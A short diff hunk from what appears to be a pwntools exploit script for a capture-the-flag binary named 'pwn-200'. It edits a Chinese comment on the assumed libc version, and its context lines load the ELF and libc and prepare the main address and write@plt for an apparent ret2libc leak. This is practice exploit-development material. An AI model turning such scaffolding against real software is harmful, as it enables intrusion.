@@ -7,7 +7,7 @@ p = pwn.process('./pwn-200')
 
 e = pwn.ELF('./pwn-200')
 
-libc = pwn.ELF('/lib32/libc-2.31.so')   # 适用于本地，已知libc库版本
+libc = pwn.ELF('/lib32/libc-2.31.so')   # 适用于本地，已知libc库版本，这里假设是2.31版本
 
 main_addr = pwn.p32(0x080484be)
 write_plt = pwn.p32(e.plt['write'])
